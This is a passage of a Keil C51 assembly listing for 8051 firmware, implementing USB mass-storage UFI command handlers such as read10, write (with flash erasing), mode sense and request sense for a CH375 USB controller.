0057 E0                MOVX    A,@DPTR
0058 FB                MOV     R3,A
0059 D3                SETB    C
005A 120000      E     LCALL   ?C?ULCMP
005D 400A              JC      ?C0163
                                           ; SOURCE LINE # 790
005F 900000      R     MOV     DPTR,#LEN
0062 120000      E     LCALL   ?C?LSTKXDATA
0065 00                DB      00H
0066 00                DB      00H
0067 00                DB      00H
0068 24                DB      024H
0069         ?C0163:
                                           ; SOURCE LINE # 791
0069         ?C0384:
0069 E4                CLR     A
006A 900000      R     MOV     DPTR,#BcswStatus
006D F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 792
006E 900000      R     MOV     DPTR,#mSenseKey
0071 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 793
0072 900000      R     MOV     DPTR,#mASC
0075 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 794
                                           ; SOURCE LINE # 795
0076         ?C0164:
0076 22                RET     
             ; FUNCTION UFI_inquiry (END)

             ; FUNCTION UFI_read10 (BEGIN)
                                           ; SOURCE LINE # 798
                                           ; SOURCE LINE # 799
                                           ; SOURCE LINE # 800
0000 7800        R     MOV     R0,#LOW MassPara+016H
0002 E6                MOV     A,@R0
0003 FF                MOV     R7,A
0004 E4                CLR     A
0005 FC                MOV     R4,A
0006 FD                MOV     R5,A
0007 FE                MOV     R6,A
0008 7808              MOV     R0,#08H
000A 120000      E     LCALL   ?C?LSHL
000D EC                MOV     A,R4
000E C0E0              PUSH    ACC
0010 ED                MOV     A,R5
0011 C0E0              PUSH    ACC
0013 EE                MOV     A,R6
0014 C0E0              PUSH    ACC
0016 EF                MOV     A,R7
0017 C0E0              PUSH    ACC
0019 7800        R     MOV     R0,#LOW MassPara+017H
001B E6                MOV     A,@R0
001C FF                MOV     R7,A
001D D0E0              POP     ACC
001F FB                MOV     R3,A
0020 D0E0              POP     ACC
0022 FA                MOV     R2,A
0023 D0E0              POP     ACC
0025 F9                MOV     R1,A
0026 D0E0              POP     ACC
0028 F8                MOV     R0,A
0029 EB                MOV     A,R3
002A 4F                ORL     A,R7
002B FF                MOV     R7,A
002C EA                MOV     A,R2
002D FE                MOV     R6,A
002E E9                MOV     A,R1
002F FD                MOV     R5,A
0030 E8                MOV     A,R0
0031 FC                MOV     R4,A
0032 E4                CLR     A
0033 FB                MOV     R3,A
0034 7A10              MOV     R2,#010H
0036 F9                MOV     R1,A
0037 F8                MOV     R0,A
0038 120000      E     LCALL   ?C?LMUL
003B 900000      R     MOV     DPTR,#LEN
003E 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 801
0041 7800        R     MOV     R0,#LOW MassPara+012H
0043 E6                MOV     A,@R0
0044 FF                MOV     R7,A
0045 E4                CLR     A
0046 FC                MOV     R4,A
0047 FD                MOV     R5,A
0048 FE                MOV     R6,A
0049 7810              MOV     R0,#010H
004B 120000      E     LCALL   ?C?LSHL
004E EC                MOV     A,R4
004F C0E0              PUSH    ACC
0051 ED                MOV     A,R5
0052 C0E0              PUSH    ACC
0054 EE                MOV     A,R6
0055 C0E0              PUSH    ACC
0057 EF                MOV     A,R7
0058 C0E0              PUSH    ACC
005A 7800        R     MOV     R0,#LOW MassPara+011H
005C E6                MOV     A,@R0
005D FF                MOV     R7,A
005E E4                CLR     A
005F FC                MOV     R4,A
0060 FD                MOV     R5,A
0061 FE                MOV     R6,A
0062 7818              MOV     R0,#018H
0064 120000      E     LCALL   ?C?LSHL
0067 D0E0              POP     ACC
0069 FB                MOV     R3,A
006A D0E0              POP     ACC
006C FA                MOV     R2,A
006D D0E0              POP     ACC
006F F9                MOV     R1,A
0070 D0E0              POP     ACC
0072 F8                MOV     R0,A
0073 EF                MOV     A,R7
0074 4B                ORL     A,R3
0075 FF                MOV     R7,A
0076 EE                MOV     A,R6
0077 4A                ORL     A,R2
0078 FE                MOV     R6,A
0079 ED                MOV     A,R5
007A 49                ORL     A,R1
007B FD                MOV     R5,A
007C EC                MOV     A,R4
007D 48                ORL     A,R0
007E C0E0              PUSH    ACC
0080 ED                MOV     A,R5
0081 C0E0              PUSH    ACC
0083 EE                MOV     A,R6
0084 C0E0              PUSH    ACC
0086 EF                MOV     A,R7
0087 C0E0              PUSH    ACC
0089 7800        R     MOV     R0,#LOW MassPara+013H
008B E6                MOV     A,@R0
008C FF                MOV     R7,A
008D E4                CLR     A
008E FC                MOV     R4,A
008F FD                MOV     R5,A
0090 FE                MOV     R6,A
0091 7808              MOV     R0,#08H
0093 120000      E     LCALL   ?C?LSHL
0096 D0E0              POP     ACC
0098 FB                MOV     R3,A
0099 D0E0              POP     ACC
009B FA                MOV     R2,A
009C D0E0              POP     ACC
009E F9                MOV     R1,A
009F D0E0              POP     ACC
00A1 F8                MOV     R0,A
00A2 EF                MOV     A,R7
00A3 4B                ORL     A,R3
00A4 FF                MOV     R7,A
00A5 EE                MOV     A,R6
00A6 4A                ORL     A,R2
00A7 FE                MOV     R6,A
00A8 ED                MOV     A,R5
00A9 49                ORL     A,R1
00AA FD                MOV     R5,A
00AB EC                MOV     A,R4
00AC 48                ORL     A,R0
00AD C0E0              PUSH    ACC
00AF ED                MOV     A,R5
00B0 C0E0              PUSH    ACC
00B2 EE                MOV     A,R6
00B3 C0E0              PUSH    ACC
00B5 EF                MOV     A,R7
00B6 C0E0              PUSH    ACC
00B8 7800        R     MOV     R0,#LOW MassPara+014H
00BA E6                MOV     A,@R0
00BB FF                MOV     R7,A
00BC D0E0              POP     ACC
00BE FB                MOV     R3,A
00BF D0E0              POP     ACC
00C1 FA                MOV     R2,A
00C2 D0E0              POP     ACC
00C4 F9                MOV     R1,A
00C5 D0E0              POP     ACC
00C7 F8                MOV     R0,A
00C8 EB                MOV     A,R3
00C9 4F                ORL     A,R7
00CA FF                MOV     R7,A
00CB EA                MOV     A,R2
00CC FE                MOV     R6,A
00CD E9                MOV     A,R1
00CE FD                MOV     R5,A
00CF E8                MOV     A,R0
00D0 FC                MOV     R4,A
00D1 900000      R     MOV     DPTR,#Locate_Addr
00D4 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 802
00D7 900000      R     MOV     DPTR,#Locate_Addr
00DA E0                MOVX    A,@DPTR
00DB FC                MOV     R4,A
00DC A3                INC     DPTR
00DD E0                MOVX    A,@DPTR
00DE FD                MOV     R5,A
00DF A3                INC     DPTR
00E0 E0                MOVX    A,@DPTR
00E1 FE                MOV     R6,A
00E2 A3                INC     DPTR
00E3 E0                MOVX    A,@DPTR
00E4 FF                MOV     R7,A
00E5 E4                CLR     A
00E6 FB                MOV     R3,A
00E7 7A10              MOV     R2,#010H
00E9 F9                MOV     R1,A
00EA F8                MOV     R0,A
00EB 120000      E     LCALL   ?C?LMUL
00EE 900000      R     MOV     DPTR,#Locate_Addr
00F1 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 803
00F4 E4                CLR     A
00F5 900000      R     MOV     DPTR,#BcswStatus
00F8 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 804
00F9 900000      R     MOV     DPTR,#mSenseKey
00FC F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 805
00FD 900000      R     MOV     DPTR,#mASC
0100 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 806
0101 D200        R     SETB    pBuf_ReSelect
                                           ; SOURCE LINE # 807
0103 22                RET     
             ; FUNCTION UFI_read10 (END)

             ; FUNCTION UFI_modeSense (BEGIN)
                                           ; SOURCE LINE # 810
                                           ; SOURCE LINE # 811
                                           ; SOURCE LINE # 812
0000 7800        R     MOV     R0,#LOW MassPara+011H
0002 E6                MOV     A,@R0
0003 643F              XRL     A,#03FH
0005 703F              JNZ     ?C0166
                                           ; SOURCE LINE # 813
                                           ; SOURCE LINE # 814
0007 7F0C              MOV     R7,#0CH
0009 FE                MOV     R6,A
000A FD                MOV     R5,A
000B FC                MOV     R4,A
000C 900000      R     MOV     DPTR,#LEN
000F E0                MOVX    A,@DPTR
0010 F8                MOV     R0,A
0011 A3                INC     DPTR
0012 E0                MOVX    A,@DPTR
0013 F9                MOV     R1,A
0014 A3                INC     DPTR
0015 E0                MOVX    A,@DPTR
0016 FA                MOV     R2,A
0017 A3                INC     DPTR
0018 E0                MOVX    A,@DPTR
0019 FB                MOV     R3,A
001A D3                SETB    C
001B 120000      E     LCALL   ?C?ULCMP
001E 400A              JC      ?C0167
0020 900000      R     MOV     DPTR,#LEN
0023 120000      E     LCALL   ?C?LSTKXDATA
0026 00                DB      00H
0027 00                DB      00H
0028 00                DB      00H
0029 0C                DB      0CH
002A         ?C0167:
                                           ; SOURCE LINE # 815
002A 900000      R     MOV     DPTR,#pBuf
002D 74FF              MOV     A,#0FFH
002F F0                MOVX    @DPTR,A
0030 A3                INC     DPTR
0031 7400        R     MOV     A,#HIGH modesense3F
0033 F0                MOVX    @DPTR,A
0034 A3                INC     DPTR
0035 7400        R     MOV     A,#LOW modesense3F
0037 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 816
0038 E4                CLR     A
0039 900000      R     MOV     DPTR,#BcswStatus
003C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 817
003D 900000      R     MOV     DPTR,#mSenseKey
0040 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 818
0041 900000      R     MOV     DPTR,#mASC
0044 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 819
0045 22                RET     
0046         ?C0166:
                                           ; SOURCE LINE # 821
                                           ; SOURCE LINE # 822
                                           ; SOURCE LINE # 823
                                           ; SOURCE LINE # 824
                                           ; SOURCE LINE # 825
                                           ; SOURCE LINE # 826
0046 120000      R     LCALL   L?0402
                                           ; SOURCE LINE # 827
                                           ; SOURCE LINE # 828
0049         ?C0169:
0049 22                RET     
             ; FUNCTION UFI_modeSense (END)

             ; FUNCTION UFI_requestSense (BEGIN)
                                           ; SOURCE LINE # 831
                                           ; SOURCE LINE # 832
                                           ; SOURCE LINE # 833
0000 A200        R     MOV     C,lastFSTALL
0002 7200        R     ORL     C,FSTALL
0004 5030              JNC     ?C0170
                                           ; SOURCE LINE # 834
                                           ; SOURCE LINE # 835
0006 A200        R     MOV     C,FSTALL
0008 9200        R     MOV     lastFSTALL,C
                                           ; SOURCE LINE # 836
000A C200        R     CLR     FSTALL
                                           ; SOURCE LINE # 837
000C 7800        R     MOV     R0,#LOW MassPara
000E 7670              MOV     @R0,#070H
                                           ; SOURCE LINE # 838
0010 E4                CLR     A
0011 08                INC     R0
0012 F6                MOV     @R0,A
                                           ; SOURCE LINE # 839
0013 900000      R     MOV     DPTR,#mSenseKey
0016 E0                MOVX    A,@DPTR
0017 08                INC     R0
0018 F6                MOV     @R0,A
                                           ; SOURCE LINE # 840
0019 E4                CLR     A
001A 08                INC     R0
001B F6                MOV     @R0,A
                                           ; SOURCE LINE # 841
001C 08                INC     R0
001D F6                MOV     @R0,A
                                           ; SOURCE LINE # 842
001E 08                INC     R0
001F F6                MOV     @R0,A
                                           ; SOURCE LINE # 843
0020 08                INC     R0
0021 F6                MOV     @R0,A
                                           ; SOURCE LINE # 844
0022 08                INC     R0
0023 760A              MOV     @R0,#0AH
                                           ; SOURCE LINE # 845
0025 08                INC     R0
0026 F6                MOV     @R0,A
                                           ; SOURCE LINE # 846
0027 08                INC     R0
0028 F6                MOV     @R0,A
                                           ; SOURCE LINE # 847
0029 08                INC     R0
002A F6                MOV     @R0,A
                                           ; SOURCE LINE # 848
002B 08                INC     R0
002C F6                MOV     @R0,A
                                           ; SOURCE LINE # 849
002D 900000      R     MOV     DPTR,#mASC
0030 E0                MOVX    A,@DPTR
0031 08                INC     R0
0032 F6                MOV     @R0,A
                                           ; SOURCE LINE # 850
0033 E4                CLR     A
                                           ; SOURCE LINE # 851
                                           ; SOURCE LINE # 852
                                           ; SOURCE LINE # 853
                                           ; SOURCE LINE # 854
                                           ; SOURCE LINE # 855
                                           ; SOURCE LINE # 856
                                           ; SOURCE LINE # 857
0034 8024              SJMP    ?C0385
0036         ?C0170:
                                           ; SOURCE LINE # 859
                                           ; SOURCE LINE # 860
0036 A200        R     MOV     C,FSTALL
0038 9200        R     MOV     lastFSTALL,C
                                           ; SOURCE LINE # 861
003A C200        R     CLR     FSTALL
                                           ; SOURCE LINE # 862
003C 7800        R     MOV     R0,#LOW MassPara
003E 7670              MOV     @R0,#070H
                                           ; SOURCE LINE # 863
0040 E4                CLR     A
0041 08                INC     R0
0042 F6                MOV     @R0,A
                                           ; SOURCE LINE # 864
0043 08                INC     R0
0044 F6                MOV     @R0,A
                                           ; SOURCE LINE # 865
0045 08                INC     R0
0046 F6                MOV     @R0,A
                                           ; SOURCE LINE # 866
0047 08                INC     R0
0048 F6                MOV     @R0,A
                                           ; SOURCE LINE # 867
0049 08                INC     R0
004A F6                MOV     @R0,A
                                           ; SOURCE LINE # 868
004B 08                INC     R0
004C F6                MOV     @R0,A
                                           ; SOURCE LINE # 869
004D 08                INC     R0
004E 760A              MOV     @R0,#0AH
                                           ; SOURCE LINE # 870
0050 08                INC     R0
0051 F6                MOV     @R0,A
                                           ; SOURCE LINE # 871
0052 08                INC     R0
0053 F6                MOV     @R0,A
                                           ; SOURCE LINE # 872
0054 08                INC     R0
0055 F6                MOV     @R0,A
                                           ; SOURCE LINE # 873
0056 08                INC     R0
0057 F6                MOV     @R0,A
                                           ; SOURCE LINE # 874
0058 08                INC     R0
0059 F6                MOV     @R0,A
                                           ; SOURCE LINE # 875
005A         ?C0385:
005A 08                INC     R0
005B F6                MOV     @R0,A
                                           ; SOURCE LINE # 876
005C 08                INC     R0
005D F6                MOV     @R0,A
                                           ; SOURCE LINE # 877
005E 08                INC     R0
005F F6                MOV     @R0,A
                                           ; SOURCE LINE # 878
0060 08                INC     R0
0061 F6                MOV     @R0,A
                                           ; SOURCE LINE # 879
0062 08                INC     R0
0063 F6                MOV     @R0,A
                                           ; SOURCE LINE # 880
0064 900000      R     MOV     DPTR,#pBuf
0067 F0                MOVX    @DPTR,A
0068 A3                INC     DPTR
0069 7400        R     MOV     A,#HIGH MassPara
006B F0                MOVX    @DPTR,A
006C A3                INC     DPTR
006D 7400        R     MOV     A,#LOW MassPara
006F F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 881
0070 E4                CLR     A
0071 900000      R     MOV     DPTR,#BcswStatus
0074 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 882
                                           ; SOURCE LINE # 883
0075         ?C0172:
0075 22                RET     
             ; FUNCTION UFI_requestSense (END)

             ; FUNCTION UFI_testUnit (BEGIN)
                                           ; SOURCE LINE # 886
                                           ; SOURCE LINE # 887
                                           ; SOURCE LINE # 888
0000 C200        R     CLR     CH375BULKDOWN
                                           ; SOURCE LINE # 889
0002 C200        R     CLR     CH375BULKUP
                                           ; SOURCE LINE # 890
0004 E4                CLR     A
0005 900000      R     MOV     DPTR,#BcswStatus
0008 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 891
0009 900000      R     MOV     DPTR,#mSenseKey
000C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 892
000D 900000      R     MOV     DPTR,#mASC
0010 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 893
0011 22                RET     
             ; FUNCTION UFI_testUnit (END)

             ; FUNCTION UFI_perOrMed (BEGIN)
                                           ; SOURCE LINE # 896
                                           ; SOURCE LINE # 897
                                           ; SOURCE LINE # 898
0000 E4                CLR     A
0001 900000      R     MOV     DPTR,#BcswStatus
0004 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 899
0005 900000      R     MOV     DPTR,#mSenseKey
0008 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 900
0009 900000      R     MOV     DPTR,#mASC
000C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 901
000D 22                RET     
             ; FUNCTION UFI_perOrMed (END)

             ; FUNCTION UFI_write (BEGIN)
                                           ; SOURCE LINE # 904
                                           ; SOURCE LINE # 905
                                           ; SOURCE LINE # 908
0000 7800        R     MOV     R0,#LOW MassPara+016H
0002 E6                MOV     A,@R0
0003 FF                MOV     R7,A
0004 E4                CLR     A
0005 FC                MOV     R4,A
0006 FD                MOV     R5,A
0007 FE                MOV     R6,A
0008 7808              MOV     R0,#08H
000A 120000      E     LCALL   ?C?LSHL
000D EC                MOV     A,R4
000E C0E0              PUSH    ACC
0010 ED                MOV     A,R5
0011 C0E0              PUSH    ACC
0013 EE                MOV     A,R6
0014 C0E0              PUSH    ACC
0016 EF                MOV     A,R7
0017 C0E0              PUSH    ACC
0019 7800        R     MOV     R0,#LOW MassPara+017H
001B E6                MOV     A,@R0
001C FF                MOV     R7,A
001D D0E0              POP     ACC
001F FB                MOV     R3,A
0020 D0E0              POP     ACC
0022 FA                MOV     R2,A
0023 D0E0              POP     ACC
0025 F9                MOV     R1,A
0026 D0E0              POP     ACC
0028 F8                MOV     R0,A
0029 EB                MOV     A,R3
002A 4F                ORL     A,R7
002B FF                MOV     R7,A
002C EA                MOV     A,R2
002D FE                MOV     R6,A
002E E9                MOV     A,R1
002F FD                MOV     R5,A
0030 E8                MOV     A,R0
0031 FC                MOV     R4,A
0032 E4                CLR     A
0033 FB                MOV     R3,A
0034 7A10              MOV     R2,#010H
0036 F9                MOV     R1,A
0037 F8                MOV     R0,A
0038 120000      E     LCALL   ?C?LMUL
003B 900000      R     MOV     DPTR,#LEN
003E 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 909
0041 7800        R     MOV     R0,#LOW MassPara+012H
0043 E6                MOV     A,@R0
0044 FF                MOV     R7,A
0045 E4                CLR     A
0046 FC                MOV     R4,A
0047 FD                MOV     R5,A
0048 FE                MOV     R6,A
0049 7810              MOV     R0,#010H
004B 120000      E     LCALL   ?C?LSHL
004E EC                MOV     A,R4
004F C0E0              PUSH    ACC
0051 ED                MOV     A,R5
0052 C0E0              PUSH    ACC
0054 EE                MOV     A,R6
0055 C0E0              PUSH    ACC
0057 EF                MOV     A,R7
0058 C0E0              PUSH    ACC
005A 7800        R     MOV     R0,#LOW MassPara+011H
005C E6                MOV     A,@R0
005D FF                MOV     R7,A
005E E4                CLR     A
005F FC                MOV     R4,A
0060 FD                MOV     R5,A
0061 FE                MOV     R6,A
0062 7818              MOV     R0,#018H
0064 120000      E     LCALL   ?C?LSHL
0067 D0E0              POP     ACC
0069 FB                MOV     R3,A
006A D0E0              POP     ACC
006C FA                MOV     R2,A
006D D0E0              POP     ACC
006F F9                MOV     R1,A
0070 D0E0              POP     ACC
0072 F8                MOV     R0,A
0073 EF                MOV     A,R7
0074 4B                ORL     A,R3
0075 FF                MOV     R7,A
0076 EE                MOV     A,R6
0077 4A                ORL     A,R2
0078 FE                MOV     R6,A
0079 ED                MOV     A,R5
007A 49                ORL     A,R1
007B FD                MOV     R5,A
007C EC                MOV     A,R4
007D 48                ORL     A,R0
007E C0E0              PUSH    ACC
0080 ED                MOV     A,R5
0081 C0E0              PUSH    ACC
0083 EE                MOV     A,R6
0084 C0E0              PUSH    ACC
0086 EF                MOV     A,R7
0087 C0E0              PUSH    ACC
0089 7800        R     MOV     R0,#LOW MassPara+013H
008B E6                MOV     A,@R0
008C FF                MOV     R7,A
008D E4                CLR     A
008E FC                MOV     R4,A
008F FD                MOV     R5,A
0090 FE                MOV     R6,A
0091 7808              MOV     R0,#08H
0093 120000      E     LCALL   ?C?LSHL
0096 D0E0              POP     ACC
0098 FB                MOV     R3,A
0099 D0E0              POP     ACC
009B FA                MOV     R2,A
009C D0E0              POP     ACC
009E F9                MOV     R1,A
009F D0E0              POP     ACC
00A1 F8                MOV     R0,A
00A2 EF                MOV     A,R7
00A3 4B                ORL     A,R3
00A4 FF                MOV     R7,A
00A5 EE                MOV     A,R6
00A6 4A                ORL     A,R2
00A7 FE                MOV     R6,A
00A8 ED                MOV     A,R5
00A9 49                ORL     A,R1
00AA FD                MOV     R5,A
00AB EC                MOV     A,R4
00AC 48                ORL     A,R0
00AD C0E0              PUSH    ACC
00AF ED                MOV     A,R5
00B0 C0E0              PUSH    ACC
00B2 EE                MOV     A,R6
00B3 C0E0              PUSH    ACC
00B5 EF                MOV     A,R7
00B6 C0E0              PUSH    ACC
00B8 7800        R     MOV     R0,#LOW MassPara+014H
00BA E6                MOV     A,@R0
00BB FF                MOV     R7,A
00BC D0E0              POP     ACC
00BE FB                MOV     R3,A
00BF D0E0              POP     ACC
00C1 FA                MOV     R2,A
00C2 D0E0              POP     ACC
00C4 F9                MOV     R1,A
00C5 D0E0              POP     ACC
00C7 F8                MOV     R0,A
00C8 EB                MOV     A,R3
00C9 4F                ORL     A,R7
00CA FF                MOV     R7,A
00CB EA                MOV     A,R2
00CC FE                MOV     R6,A
00CD E9                MOV     A,R1
00CE FD                MOV     R5,A
00CF E8                MOV     A,R0
00D0 FC                MOV     R4,A
00D1 900000      R     MOV     DPTR,#Locate_Addr
00D4 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 910
00D7 900000      R     MOV     DPTR,#Locate_Addr
00DA E0                MOVX    A,@DPTR
00DB FC                MOV     R4,A
00DC A3                INC     DPTR
00DD E0                MOVX    A,@DPTR
00DE FD                MOV     R5,A
00DF A3                INC     DPTR
00E0 E0                MOVX    A,@DPTR
00E1 FE                MOV     R6,A
00E2 A3                INC     DPTR
00E3 E0                MOVX    A,@DPTR
00E4 FF                MOV     R7,A
00E5 E4                CLR     A
00E6 FB                MOV     R3,A
00E7 7A10              MOV     R2,#010H
00E9 F9                MOV     R1,A
00EA F8                MOV     R0,A
00EB 120000      E     LCALL   ?C?LMUL
00EE 900000      R     MOV     DPTR,#Locate_Addr
00F1 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 911
00F4 7F40              MOV     R7,#040H
00F6 7E4B              MOV     R6,#04BH
00F8 7D4C              MOV     R5,#04CH
00FA 7C00              MOV     R4,#00H
00FC 900000      R     MOV     DPTR,#Locate_Addr
00FF E0                MOVX    A,@DPTR
0100 F8                MOV     R0,A
0101 A3                INC     DPTR
0102 E0                MOVX    A,@DPTR
0103 F9                MOV     R1,A
0104 A3                INC     DPTR
0105 E0                MOVX    A,@DPTR
0106 FA                MOV     R2,A
0107 A3                INC     DPTR
0108 E0                MOVX    A,@DPTR
0109 FB                MOV     R3,A
010A C3                CLR     C
010B 120000      E     LCALL   ?C?ULCMP
010E 5048              JNC     ?C0175
                                           ; SOURCE LINE # 912
                                           ; SOURCE LINE # 913
0110 7800        R     MOV     R0,#LOW MassPara+017H
0112 E6                MOV     A,@R0
0113 900000      R     MOV     DPTR,#num
0116 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 914
0117 E4                CLR     A
0118 900000      R     MOV     DPTR,#i
011B F0                MOVX    @DPTR,A
011C         ?C0176:
011C 900000      R     MOV     DPTR,#num
011F E0                MOVX    A,@DPTR
0120 FF                MOV     R7,A
0121 900000      R     MOV     DPTR,#i
0124 E0                MOVX    A,@DPTR
0125 FE                MOV     R6,A
0126 C3                CLR     C
0127 9F                SUBB    A,R7
0128 502E              JNC     ?C0175
                                           ; SOURCE LINE # 915
012A EE                MOV     A,R6
012B FF                MOV     R7,A
012C 7E00              MOV     R6,#00H
012E 7C10              MOV     R4,#010H
0130 7D00              MOV     R5,#00H
0132 120000      E     LCALL   ?C?LIMUL
0135 900000      R     MOV     DPTR,#Locate_Addr
0138 E0                MOVX    A,@DPTR
0139 F8                MOV     R0,A
013A A3                INC     DPTR
013B E0                MOVX    A,@DPTR
013C F9                MOV     R1,A
013D A3                INC     DPTR
013E E0                MOVX    A,@DPTR
013F FA                MOV     R2,A
0140 A3                INC     DPTR
0141 E0                MOVX    A,@DPTR
0142 2F                ADD     A,R7
0143 FF                MOV     R7,A
0144 EA                MOV     A,R2
0145 3E                ADDC    A,R6
0146 FE                MOV     R6,A
0147 E9                MOV     A,R1
0148 3D                ADDC    A,R5
0149 FD                MOV     R5,A
014A E8                MOV     A,R0
014B 3C                ADDC    A,R4
014C FC                MOV     R4,A
014D 120000      R     LCALL   _EraseFlash
0150 900000      R     MOV     DPTR,#i
0153 E0                MOVX    A,@DPTR
0154 04                INC     A
0155 F0                MOVX    @DPTR,A
0156 80C4              SJMP    ?C0176
                                           ; SOURCE LINE # 916
0158         ?C0175:
                                           ; SOURCE LINE # 917
0158 E4                CLR     A
0159 900000      R     MOV     DPTR,#BcswStatus
015C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 918
015D 900000      R     MOV     DPTR,#mSenseKey
0160 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 919
0161 900000      R     MOV     DPTR,#mASC
0164 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 920
0165 22                RET     
             ; FUNCTION UFI_write (END)

             ; FUNCTION UFI_staStoUnit (BEGIN)
                                           ; SOURCE LINE # 923
                                           ; SOURCE LINE # 924
                                           ; SOURCE LINE # 925
0000 C200        R     CLR     CH375BULKDOWN
                                           ; SOURCE LINE # 926
0002 C200        R     CLR     CH375BULKUP
                                           ; SOURCE LINE # 927
0004 E4                CLR     A
0005 900000      R     MOV     DPTR,#BcswStatus
0008 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 928
0009 900000      R     MOV     DPTR,#mSenseKey
000C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 929
000D 900000      R     MOV     DPTR,#mASC
0010 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 930
0011 22                RET     
             ; FUNCTION UFI_staStoUnit (END)

             ; FUNCTION UFI_verify (BEGIN)
                                           ; SOURCE LINE # 933
                                           ; SOURCE LINE # 934
                                           ; SOURCE LINE # 935
0000 E4                CLR     A
0001 900000      R     MOV     DPTR,#BcswStatus
0004 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 936
0005 900000      R     MOV     DPTR,#mSenseKey
0008 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 937
0009 900000      R     MOV     DPTR,#mASC
000C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 940
000D 22                RET     
             ; FUNCTION UFI_verify (END)

             ; FUNCTION UFI_modeSense5 (BEGIN)
                                           ; SOURCE LINE # 942
                                           ; SOURCE LINE # 943
                                           ; SOURCE LINE # 944
0000 7800        R     MOV     R0,#LOW MassPara+011H
0002 E6                MOV     A,@R0
0003 643F              XRL     A,#03FH
0005 703F              JNZ     ?C0182
                                           ; SOURCE LINE # 945
                                           ; SOURCE LINE # 946
0007 7F10              MOV     R7,#010H
0009 FE                MOV     R6,A
000A FD                MOV     R5,A
000B FC                MOV     R4,A
000C 900000      R     MOV     DPTR,#LEN
000F E0                MOVX    A,@DPTR
0010 F8                MOV     R0,A
0011 A3                INC     DPTR
0012 E0                MOVX    A,@DPTR
0013 F9                MOV     R1,A
0014 A3                INC     DPTR
0015 E0                MOVX    A,@DPTR
0016 FA                MOV     R2,A
0017 A3                INC     DPTR
0018 E0                MOVX    A,@DPTR
0019 FB                MOV     R3,A
001A D3                SETB    C
001B 120000      E     LCALL   ?C?ULCMP
001E 400A              JC      ?C0183
                                           ; SOURCE LINE # 947
0020 900000      R     MOV     DPTR,#LEN
0023 120000      E     LCALL   ?C?LSTKXDATA
0026 00                DB      00H
0027 00                DB      00H
0028 00                DB      00H
0029 10                DB      010H
002A         ?C0183:
                                           ; SOURCE LINE # 948
002A 900000      R     MOV     DPTR,#pBuf
002D 74FF              MOV     A,#0FFH
002F F0                MOVX    @DPTR,A
0030 A3                INC     DPTR
0031 7400        R     MOV     A,#HIGH mode5sense3F
0033 F0                MOVX    @DPTR,A
0034 A3                INC     DPTR
0035 7400        R     MOV     A,#LOW mode5sense3F
0037 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 949
0038 E4                CLR     A
0039 900000      R     MOV     DPTR,#BcswStatus
003C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 950
003D 900000      R     MOV     DPTR,#mSenseKey
0040 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 951
0041 900000      R     MOV     DPTR,#mASC
0044 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 952
0045 22                RET     
0046         ?C0182:
                                           ; SOURCE LINE # 954
                                           ; SOURCE LINE # 955
                                           ; SOURCE LINE # 956
                                           ; SOURCE LINE # 957
                                           ; SOURCE LINE # 958
                                           ; SOURCE LINE # 959
0046 120000      R     LCALL   L?0402
                                           ; SOURCE LINE # 960
                                           ; SOURCE LINE # 961
0049         ?C0185:
0049 22                RET     
             ; FUNCTION UFI_modeSense5 (END)

             ; FUNCTION UFI_readTOC (BEGIN)
                                           ; SOURCE LINE # 963
                                           ; SOURCE LINE # 964
                                           ; SOURCE LINE # 965
0000 C8                XCH     A,R0
0001 7400        R     MOV     A,#LOW TOC
0003 C8                XCH     A,R0
0004 CC                XCH     A,R4
0005 7400        R     MOV     A,#HIGH TOC
0007 CC                XCH     A,R4
0008 CD                XCH     A,R5
0009 7401              MOV     A,#01H
000B CD                XCH     A,R5
000C 7BFF              MOV     R3,#0FFH
000E 7A00        R     MOV     R2,#HIGH _?ix1000
0010 7900        R     MOV     R1,#LOW _?ix1000
0012 7E00              MOV     R6,#00H
0014 7F14              MOV     R7,#014H
0016 120000      E     LCALL   ?C?COPY
                                           ; SOURCE LINE # 969
0019 900000      R     MOV     DPTR,#pBuf
001C 7401              MOV     A,#01H
001E F0                MOVX    @DPTR,A
001F A3                INC     DPTR
0020 7400        R     MOV     A,#HIGH TOC
0022 F0                MOVX    @DPTR,A
0023 A3                INC     DPTR
0024 7400        R     MOV     A,#LOW TOC
0026 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 970
0027 E4                CLR     A
0028 7F14              MOV     R7,#014H
002A FE                MOV     R6,A
002B FD                MOV     R5,A
002C FC                MOV     R4,A
